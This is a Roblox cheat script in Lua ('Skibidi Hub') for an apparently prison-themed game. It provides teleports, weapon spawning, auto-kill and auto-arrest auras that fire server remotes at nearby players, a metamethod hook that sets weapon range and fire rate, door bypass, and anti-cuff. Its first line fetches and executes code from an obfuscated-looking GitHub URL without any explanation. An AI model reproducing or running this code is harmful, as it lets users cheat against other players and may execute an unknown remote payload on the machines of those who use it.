loadstring(game:HttpGet("https://raw.githubusercontent.com/virtualtable/SSS22200DXLKdjaksfvdhgjs29dcAK/refs/heads/main/AK2ksSKSKSSSKSKSKxK222SKsKDJHSDJHSDFSDAJKGFHJASDF.lua"))()

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character or (LocalPlayer.CharacterAdded:wait() and LocalPlayer.Character)

local DisconnectStamina = function(TargetHumanoid)
    task.wait(1)
    local JumpConns = getconnections(TargetHumanoid.Jumping)
    for _, JumpConn in pairs(JumpConns) do
        JumpConn:Disconnect()
    end
end

local HandleChar = function(Character)
    local Humanoid = Character:WaitForChild("Humanoid", 10)
    if Humanoid then
        DisconnectStamina(Humanoid)
    else
    end
end

HandleChar(Character)
LocalPlayer.CharacterAdded:Connect(HandleChar)
local cmdPrefix = "!"
config = {
    deathTracker = true,
    antiCuff = true,
    antiStun = true,
    instantRevive = true,
    autoWeapons = true,
    weaponOP = true,
    rapidFire = true,
    rapidRate = 0, 
    noBarriers = true,
    combatRadius = false,
    combatRange = 25,
    combatVisual = false,
    arrestRadius = false
}
local StarterGui = game:GetService("StarterGui")
local function Toast(msg, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "Skibidi Hub 🎃";
            Text = msg;
            Duration = duration or 2;
        })
    end)
end
local Sirius = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Hub = Sirius:CreateWindow({
    Name = "Skibidi Hub 🎃",
    Icon = nil,
    LoadingTitle = "Skibidi Hub v1.0",
    ConfigurationSaving = { Enabled = false },
    Discord = { Enabled = false },
    KeySystem = false,
})
local CombatPanel = Hub:CreateTab("Combat Zone", nil)
local TeleportPanel = Hub:CreateTab("Warp Points", nil)
local AutomationPanel = Hub:CreateTab("Auto Systems", nil)
local DefensePanel = Hub:CreateTab("Protection", nil)
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Run = game:GetService("RunService")
local HB = Run.Heartbeat
local RS = Run.RenderStepped
local SS = Run.Stepped
local RSto = game:GetService("ReplicatedStorage")
local DeathLog = RSto:WaitForChild("Killfeed")
local PlayerUI = LP.PlayerGui
local MainUI = PlayerUI:WaitForChild("Home")
local Cam = workspace.Camera
local Factions = game:GetService("Teams")
local FactionRemote = workspace:WaitForChild("Remote"):WaitForChild("TeamEvent")
local ver = "v1"
local WarpSpots = {
    spawn = CFrame.new(879, 28, 2349),
    cells = CFrame.new(918.97, 99.99, 2451.42),
    nexus = CFrame.new(877.93, 99.99, 2373.57, 0.9895, 1.65e-8, 0.1446, -3.13e-8, 1, 1.01e-7, -0.1446, -1.04e-7, 0.9895),
    armory = CFrame.new(836.13, 99.99, 2284.56, 0.9998, 5.64e-8, -0.0173, -5.64e-8, 1, 2.33e-9, 0.0173, -1.35e-9, 0.9998),
    yard = CFrame.new(787.56, 98, 2468.32, -0.9997, -7.33e-8, -0.0227, -7.5e-8, 1, 7.45e-8, 0.0227, 7.62e-8, -0.9997),
    crimden = CFrame.new(-864.76, 94.48, 2085.88, 0.9993, 1.79e-8, 0.0378, -1.86e-8, 1, 1.83e-8, -0.0378, -1.89e-8, 0.9993),
    cafe = CFrame.new(884.49, 99.99, 2293.55, -0.0629, -2.14e-8, -0.998, -9.53e-8, 1, -1.55e-8, 0.998, 9.41e-8, -0.0629),
    kitchen = CFrame.new(936.63, 99.99, 2224.77, -0.0027, -9.31e-8, 0.9999, -3.29e-8, 1, 9.3e-8, -0.9999, -3.26e-8, -0.0027),
    rooftop = CFrame.new(918.69, 139.71, 2266.61, -0.9988, -7.56e-8, -0.0492, -7.85e-8, 1, 5.63e-8, 0.0492, 6.01e-8, -0.9988),
    vents = CFrame.new(933.55, 121.53, 2232.8),
    office = CFrame.new(706.19, 103.15, 2344.4),
    yellowtower = CFrame.new(786.73, 125.04, 2587.8, -0.0578, 8.82e-8, 0.9983, 6.1e-8, 1, -8.49e-8, -0.9983, 5.6e-8, -0.0578),
    greentower = CFrame.new(505.55, 125.04, 2127.41, -0.9991, 5.45e-8, 0.0424, 5.37e-8, 1, -2.03e-8, -0.0424, -1.8e-8, -0.9991),
    garage = CFrame.new(618.71, 98.04, 2469.14, 0.9973, 1.86e-8, -0.0729, -1.79e-8, 1, 9.42e-9, 0.0729, -8.09e-9, 0.9973),
    sewers = CFrame.new(917.12, 78.7, 2297.05, -0.9993, -9.98e-8, -0.0379, -1.01e-7, 1, 3.78e-8, 0.0379, 4.16e-8, -0.9993),
    suburb = CFrame.new(-281.25, 54.18, 2484.76, 0.0409, 3.26e-8, 0.9992, -3.88e-8, 1, -3.11e-8, -0.9992, -3.75e-8, 0.0409),
    gasstation = CFrame.new(-497.28, 54.39, 1686.32, 0.5851, -4.33e-8, -0.8109, 5.34e-13, 1, -5.34e-8, 0.8109, 3.13e-8, 0.5851),
    deadzone = CFrame.new(-979.85, 54.18, 1382.79, 0.0153, 8.88e-9, 0.9999, 6.75e-8, 1, -9.91e-9, -0.9999, 6.77e-8, 0.0153),
    shop = CFrame.new(455.09, 11.43, 1222.9, 0.9999, -3.93e-9, 0.0095, 2.84e-9, 1, 1.14e-7, -0.0095, -1.14e-7, 0.9999),
    roadblock = CFrame.new(1060.82, 67.57, 1847.09, 0.0752, -1.01e-8, -0.9972, 4.31e-10, 1, -1.01e-8, 0.9972, 3.31e-10, 0.0752),
    trapzone = CFrame.new(-306.72, 84.24, 1984.13, -0.8022, 5.71e-8, -0.597, 4.82e-8, 1, 3.08e-8, 0.597, -4.03e-9, -0.8022),
    mansion = CFrame.new(-315.79, 64.57, 1840.84, 0.807, -4.48e-8, 0.5906, 1.14e-8, 1, 6.03e-8, -0.5906, -4.19e-8, 0.807),
    trapden = CFrame.new(-943.97, 94.13, 1919.74, 0.0256, -1.48e-8, 0.9997, 1e-7, 1, 1.22e-8, -0.9997, 1e-7, 0.0256),
    skybuilding = CFrame.new(-317.69, 118.84, 2009.28, 0.7495, 2.48e-9, 0.662, 3.52e-10, 1, -4.15e-9, -0.662, 3.34e-9, 0.7495)
}
local function warpTo(dest)
    local cf = WarpSpots[dest:lower()]
    if not cf then warn("Invalid warp:", dest) return end
    local char = LP.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then warn("Character missing!") return end
    char.HumanoidRootPart.CFrame = cf
    Toast("Warped to: " .. dest)
end
local weaponMap = {
    ["pistol"] = "M9",
    ["ak"] = "AK-47",
    ["ak47"] = "AK-47",
    ["shotty"] = "Remington 870",
    ["rem"] = "Remington 870",
    ["m4"] = "M4A1",
    ["rifle"] = "M4A1"
}
local weapons = {"M9", "AK-47", "M4A1", "Remington 870"}
local cachedSpawners = {}
local function locateSpawner(weapon)
    if cachedSpawners[weapon] then return cachedSpawners[weapon], true end
    for _, obj in workspace:GetChildren() do
        if obj.Name == "TouchGiver" and obj:GetAttribute("ToolName") == weapon then
            cachedSpawners[weapon] = obj.TouchGiver
            return obj.TouchGiver, false
        end
    end
end
local function grabTool(name)
    return LP:FindFirstChild("Backpack") and LP.Backpack:FindFirstChild(name) or LP.Character and LP.Character:FindFirstChild(name)
end
local function spawnWeapon(name)
    local spawner, found = locateSpawner(name)
    if not found then
        local clone = spawner:Clone()
        clone.Parent = spawner.Parent
        spawner.Parent = workspace.Folder
        spawner.CanCollide = false
        spawner.Transparency = 1
    end
    local root = LP.Character:WaitForChild("HumanoidRootPart")
    repeat task.wait()
        spawner.CFrame = root.CFrame * CFrame.new(math.random(-2,2),0,0)
    until grabTool(name)
end
local function fixView()
    MainUI.hud.Visible = true
    MainUI.intro.Visible = false
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    Cam.CameraType = Enum.CameraType.Custom
    if LP.Character then Cam.CameraSubject = LP.Character:WaitForChild("Humanoid") end
end
local function hasWeapon(name)
    local bp = LP:WaitForChild("Backpack")
    local ch = LP.Character or LP.CharacterAdded:Wait()
    return bp:FindFirstChild(name) or ch:FindFirstChild(name)
end
local function goCriminal(died, oldPos)
    local crimSpawn = workspace["Criminals Spawn"].SpawnLocation
    local char = LP.Character
    if not char then return end
    local hrp = char:WaitForChild("HumanoidRootPart")
    local prev = died and hrp.CFrame or oldPos
    hrp.CFrame = crimSpawn.CFrame
    Toast("Moving to Criminal Spawn...")
    repeat task.wait() until LP.Team == Factions.Criminals
    Toast("Now Criminal!")
    hrp.CFrame = prev
    Toast("Returned to original spot.")
end
local function collectWeapons(list)
    local got = {}
    for _, w in ipairs(list) do
        if not hasWeapon(w) then
            spawnWeapon(w)
            table.insert(got, w)
            task.wait(0.35)
        end
    end
    if #got == 0 then Toast("All weapons already owned!")
    elseif #got == 1 then Toast("Grabbed " .. got[1])
    else Toast("Collected all weapons!") end
end

local function dropTools() LP.Character:FindFirstChild("Humanoid"):UnequipTools() end
local function equipTool(tool) LP.Character:FindFirstChild("Humanoid"):EquipTool(tool) end
local function findPlayer(partial, returnInstance)
    partial = partial:lower()
    for _, p in Players:GetPlayers() do
        if p.Name:lower():sub(1, #partial) == partial or p.DisplayName:lower():sub(1, #partial) == partial then
            Toast("Found: " .. p.Name)
            return returnInstance and p or p, p.Name
        end
    end
    return nil
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if method == "GetAttributes" then
        local stats = oldNamecall(self, ...)
        if config.weaponOP and config.rapidFire then
            stats.Range = 999999999
            stats.Spread = 999999999
            stats.AutoFire = true
            stats.FireRate = config.rapidRate
        elseif config.weaponOP then
            stats.Range = 999999999
            stats.Spread = 999999999
        elseif config.rapidFire then
            stats.AutoFire = true
            stats.FireRate = config.rapidRate
        end
        return stats
    end
    return oldNamecall(self, ...)
end)
local auraSphere = Instance.new("Part")
auraSphere.Shape = Enum.PartType.Ball
auraSphere.Size = Vector3.new(config.combatRange*2, config.combatRange*2, config.combatRange*2)
auraSphere.Anchored = true
auraSphere.CanCollide = false
auraSphere.Material = Enum.Material.ForceField
auraSphere.Color = Color3.fromRGB(200, 0, 50)
auraSphere.Transparency = config.combatVisual and 0.5 or 1
auraSphere.Parent = workspace
HB:Connect(function()
    if not config.combatRadius then auraSphere.Transparency = 1; return end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    auraSphere.Size = Vector3.new(config.combatRange*2, config.combatRange*2, config.combatRange*2)
    auraSphere.Transparency = config.combatVisual and 0.5 or 1
    auraSphere.Position = root.Position
    local nearby = workspace:GetPartBoundsInRadius(root.Position, config.combatRange)
    local hit = {}
    for _, part in nearby do
        local model = part.Parent
        local hum = model:FindFirstChild("Humanoid")
        if hum then
            local target = Players:GetPlayerFromCharacter(model)
            if target and target ~= LP and not hit[target] then
                hit[target] = true
                RSto.meleeEvent:FireServer(target)
            end
        end
    end
end)

DeathLog.ChildAdded:Connect(function(entry)
    if config.deathTracker then
        Toast(entry.Name, 1)
    end
end)

local baseSpeed = 16
local baseJump = 50
task.spawn(function()
    while HB:Wait() do
        local char = LP.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                if hum.WalkSpeed > 0 then baseSpeed = hum.WalkSpeed end
                if hum.JumpPower > 0 then baseJump = hum.JumpPower end
            end
        end
    end
end)

local arrestRemote = RSto.Remotes.ArrestPlayer
HB:Connect(function()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root or not config.arrestRadius then return end
    for _, p in Players:GetPlayers() do
        if p ~= LP then
            local ch = p.Character
            if ch then
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                local hum = ch:FindFirstChild("Humanoid")
                if hrp and hum and hum.Health > 0 and (root.Position - hrp.Position).Magnitude <= 10 then
                    task.spawn(function() pcall(arrestRemote.InvokeServer, arrestRemote, p) end)
                end
            end
        end
    end
end)

LP.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid")
    local anim = hum:WaitForChild("Animator")
    anim.AnimationPlayed:Connect(function(track)
        if config.antiCuff and track.Animation.AnimationId == "rbxassetid://287112271" then
            hum:ChangeState(Enum.HumanoidStateType.Dead)
            local pos = char:WaitForChild("HumanoidRootPart").CFrame
            local wasCrim = (LP.TeamColor.Name == "Really red")
            LP.CharacterAdded:Wait()
            repeat task.wait() until LP.Character:FindFirstChild("HumanoidRootPart")
            if wasCrim then
                task.wait(1)
                goCriminal(false, pos)
            elseif not config.instantRevive then
                char.HumanoidRootPart.CFrame = pos
            end
        end

        if config.antiStun and track.Animation.AnimationId == "rbxassetid://279227693" then
            track:Stop()
            track:Destroy()
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
            hum.WalkSpeed = baseSpeed
            hum.JumpPower = baseJump
        end
    end)
end)
if not _G.FactionCD then _G.FactionCD = 0 end
if not _G.QuickRevive then _G.QuickRevive = true end
local cdTime = 10
local inCD = false
function _G.ResetCD()
    if not inCD then
        inCD = true
        _G.QuickRevive = false
        task.wait(cdTime)
        _G.QuickRevive = true
        inCD = false
    end
end
local lastDeathPos = nil
local function teleportTo(cf, char)
    char = char or LP.Character
    if not char then return end
    local root = char:WaitForChild("HumanoidRootPart")
    root.CFrame = cf
end
local function canSwitch()
    local now = os.time()
    if now < _G.FactionCD then
        Toast("Faction switch in " .. (_G.FactionCD - now) .. "s!")
        return false
    end
    return true
end
local function switchFaction(target, skipCD)
    if target == Factions.Criminals then skipCD = true end
    if not skipCD and not canSwitch() then return end
    local current = LP.Team
    local function change(t)
        repeat
            FactionRemote:FireServer(t)
            task.wait(0.2)
        until LP.Team == t
    end
    if current == Factions.Inmates then
        if target == Factions.Guards then
            change(Factions.Neutral); change(Factions.Guards)
        elseif target == Factions.Criminals then
            local ch = LP.Character
            if ch then goCriminal(false, ch:WaitForChild("HumanoidRootPart").CFrame) end
        end
    elseif current == Factions.Guards then
        if target == Factions.Inmates then
            change(Factions.Neutral); change(Factions.Inmates)
        elseif target == Factions.Criminals then
            local ch = LP.Character
            if ch then
                change(Factions.Neutral); change(Factions.Inmates)
                fixView()
                goCriminal(false, ch:WaitForChild("HumanoidRootPart").CFrame)
            end
        end
    elseif current == Factions.Criminals then
        if target == Factions.Inmates then change(Factions.Neutral); change(Factions.Inmates)
        elseif target == Factions.Guards then change(Factions.Neutral); change(Factions.Guards) end
    elseif current == Factions.Neutral then change(target) end
    if target ~= Factions.Criminals and (target == Factions.Inmates or target == Factions.Guards) then
        _G.FactionCD = os.time() + 10
        task.spawn(_G.ResetCD)
    end
    fixView()
end
LP.CharacterAdded:Connect(function(char)
    local root = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if lastDeathPos then task.wait(0.1); root.CFrame = lastDeathPos end
    hum.Died:Connect(function()
        if not config.instantRevive then return end
        if root then lastDeathPos = root.CFrame end
        if _G.QuickRevive and os.time() >= _G.FactionCD then
            _G.QuickRevive = false
            task.spawn(function()
                local team = LP.Team
                if team == Factions.Inmates then
                    repeat task.wait() FactionRemote:FireServer(Factions.Neutral) until LP.Team == Factions.Neutral
                    repeat task.wait() FactionRemote:FireServer(Factions.Inmates) until LP.Team == Factions.Inmates
                    fixView()
                elseif team == Factions.Guards then
                    repeat task.wait() FactionRemote:FireServer(Factions.Neutral) until LP.Team == Factions.Neutral
                    repeat task.wait() FactionRemote:FireServer(Factions.Guards) until LP.Team == Factions.Guards
                    fixView()
                elseif team == Factions.Criminals then
                    Toast("Quick revive unavailable for Criminals!")
                end
                _G.QuickRevive = true
            end)
        end
    end)
end)
LP:GetMouse().KeyDown:Connect(function(k)
    if k:lower() == "g" then
        for _, w in weapons do
            if w == "M4A1" and not plr_pass then else
                if not grabTool(w) then spawnWeapon(w) end
            end
        end
    end
end)
local function removeBarriers()
    for _, container in {workspace:FindFirstChild("Doors"), workspace:FindFirstChild("CellDoors")} do
        if container then
            for _, part in container:GetDescendants() do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                    part.Transparency = 0.6
                end
            end
        end
    end
end
local function restoreBarriers()
    for _, container in {workspace:FindFirstChild("Doors"), workspace:FindFirstChild("CellDoors")} do
        if container then
            for _, part in container:GetDescendants() do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                    part.Transparency = 0
                end
            end
        end
    end
end
local function hasRIOT()
    if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LP.UserId, 643697197) then return true, "NEW" end
    if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LP.UserId, 96651) then return true, "LEGACY" end
    return false, "N/A"
end
plr_pass, passType = hasRIOT()
HB:Connect(function()
    if config.autoWeapons then
        for _, w in weapons do
            if w == "M4A1" and not plr_pass then else
                if not grabTool(w) then spawnWeapon(w) end
            end
        end
    end
    if config.noBarriers then removeBarriers() end
end)
local function processCmd(text)
    local msg = text:lower()
    if msg == cmdPrefix.."weapons" or msg == cmdPrefix.."allweapons" then
        collectWeapons(weapons); return
    end
    if msg:sub(1, #cmdPrefix+3) == cmdPrefix.."gun" then
        local args = msg:split(" ")
        local alias = args[2]
        if alias and weaponMap[alias] then collectWeapons({weaponMap[alias]}) end
        return
    end
    if msg:sub(1, #cmdPrefix+2) == cmdPrefix.."tp" then
        local args = msg:split(" ")
        local loc = args[2]
        if loc then warpTo(loc) end
        return
    end
    if msg:sub(1, #cmdPrefix+5) == cmdPrefix.."faction" then
        local args = msg:split(" ")
        local team = args[2]
        if not team then return end
        if team == "crim" or team == "criminals" then switchFaction(Factions.Criminals)
        elseif team == "inmate" or team == "prisoner" then switchFaction(Factions.Inmates)
        elseif team == "guard" or team == "guards" then
            if #Factions.Guards:GetPlayers() > 7 then Toast("Guard team full!") else switchFaction(Factions.Guards) end
        end
        return
    end
    if msg == cmdPrefix.."opguns" then config.weaponOP = true; config.rapidFire = true; Toast("OP + Rapid Fire ON") end
    if msg == cmdPrefix.."unopguns" then config.weaponOP = false; config.rapidFire = false; Toast("OP + Rapid Fire OFF") end
    if msg == cmdPrefix.."rapid" then config.rapidFire = true; Toast("Rapid Fire ON") end
    if msg == cmdPrefix.."unrapid" then config.rapidFire = false; Toast("Rapid Fire OFF") end
    if msg == cmdPrefix.."radius" then config.combatRadius = true; Toast("Combat Radius ON") end
    if msg == cmdPrefix.."unradius" then config.combatRadius = false; Toast("Combat Radius OFF") end
    if msg == cmdPrefix.."arrest" then config.arrestRadius = true; Toast("Arrest Radius ON (be Guard!)") end
    if msg == cmdPrefix.."unarrest" then config.arrestRadius = false; Toast("Arrest Radius OFF") end
    if msg == cmdPrefix.."showsphere" then config.combatVisual = true; Toast("Sphere visible") end
    if msg == cmdPrefix.."hidesphere" then config.combatVisual = false; Toast("Sphere hidden") end
    if msg == cmdPrefix.."revive" then config.instantRevive = true; Toast("Instant Revive ON") end
    if msg == cmdPrefix.."unrevive" then config.instantRevive = false; Toast("Instant Revive OFF") end
    if msg == cmdPrefix.."cuff" then config.antiCuff = true; Toast("Anti-Cuff ON") end
    if msg == cmdPrefix.."uncuff" then config.antiCuff = false; Toast("Anti-Cuff OFF") end
    if msg == cmdPrefix.."stun" then config.antiStun = true; Toast("Anti-Stun ON") end
    if msg == cmdPrefix.."unstun" then config.antiStun = false; Toast("Anti-Stun OFF") end
    if msg == cmdPrefix.."autoweapons" then config.autoWeapons = true; Toast("Auto Weapons ON") end
    if msg == cmdPrefix.."unautoweapons" then config.autoWeapons = false; Toast("Auto Weapons OFF") end
    if msg == cmdPrefix.."nodoors" then config.noBarriers = true; Toast("Doors bypassed") end
    if msg == cmdPrefix.."adddoors" then config.noBarriers = false; restoreBarriers(); Toast("Doors restored") end
end
game:GetService("TextChatService").MessageReceived:Connect(function(msg)
    if not msg.TextSource then return end
    local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
    if sender and sender == LP then processCmd(msg.Text) end
end)
CombatPanel:CreateSection("Faction Switch")
CombatPanel:CreateButton({ Name = "Become Inmate", Callback = function() switchFaction(Factions.Inmates) end })
CombatPanel:CreateButton({ Name = "Become Guard", Callback = function()
    if #Factions.Guards:GetPlayers() > 7 then Toast("Guard team full!") else switchFaction(Factions.Guards) end
end })
CombatPanel:CreateButton({ Name = "Become Criminal", Callback = function() switchFaction(Factions.Criminals) end })
CombatPanel:CreateSection("Weapon Control")
CombatPanel:CreateDropdown({ Name = "Spawn Weapon", Options = weapons, Callback = function(opt) spawnWeapon(opt[1]) end })
CombatPanel:CreateButton({ Name = "Spawn All Weapons", Callback = function()
    for _, w in weapons do if w ~= "M4A1" or plr_pass then if not grabTool(w) then spawnWeapon(w) end end end
end })

CombatPanel:CreateSection("Combat Enhancements")
CombatPanel:CreateToggle({ Name = "OP Guns (Range+Spread)", CurrentValue = config.weaponOP, Callback = function(v) config.weaponOP = v end })
CombatPanel:CreateToggle({ Name = "Rapid Fire", CurrentValue = config.rapidFire, Callback = function(v) config.rapidFire = v end })
CombatPanel:CreateSlider({ Name = "Fire Rate", Range = {0,100}, Increment = 1, Suffix = "RPS", CurrentValue = config.rapidRate, Callback = function(v) config.rapidRate = v end })

CombatPanel:CreateSection("Aura Systems")
CombatPanel:CreateToggle({ Name = "Combat Radius", CurrentValue = config.combatRadius, Callback = function(v) config.combatRadius = v end })
CombatPanel:CreateToggle({ Name = "Arrest Radius", CurrentValue = config.arrestRadius, Callback = function(v) config.arrestRadius = v end })
CombatPanel:CreateToggle({ Name = "Show Radius Sphere", CurrentValue = config.combatVisual, Callback = function(v) config.combatVisual = v end })
CombatPanel:CreateSlider({ Name = "Combat Range", Range = {1,50}, Increment = 1, Suffix = "studs", CurrentValue = config.combatRange, Callback = function(v) config.combatRange = v end })

local tpList = {}
for k in pairs(WarpSpots) do table.insert(tpList, k) end
table.sort(tpList)
local selectedLoc = nil
TeleportPanel:CreateSection("Destinations")
TeleportPanel:CreateDropdown({ Name = "Choose Location", Options = tpList, Callback = function(opt) selectedLoc = opt[1] end })
TeleportPanel:CreateButton({ Name = "Warp Now", Callback = function() if selectedLoc then warpTo(selectedLoc) end end })

AutomationPanel:CreateSection("Auto Features")
AutomationPanel:CreateToggle({ Name = "Instant Revive", CurrentValue = config.instantRevive, Callback = function(v) config.instantRevive = v end })
AutomationPanel:CreateToggle({ Name = "Auto Weapons", CurrentValue = config.autoWeapons, Callback = function(v) config.autoWeapons = v end })
AutomationPanel:CreateToggle({ Name = "Bypass Doors", CurrentValue = config.noBarriers, Callback = function(v) config.noBarriers = v; if not v then restoreBarriers() end end })

DefensePanel:CreateSection("Defensive Systems")
DefensePanel:CreateToggle({ Name = "Anti-Cuff", CurrentValue = config.antiCuff, Callback = function(v) config.antiCuff = v end })
DefensePanel:CreateToggle({ Name = "Anti-Stun", CurrentValue = config.antiStun, Callback = function(v) config.antiStun = v end })
DefensePanel:CreateToggle({ Name = "Death Tracker", CurrentValue = config.deathTracker, Callback = function(v) config.deathTracker = v end })
Sirius:LoadConfiguration()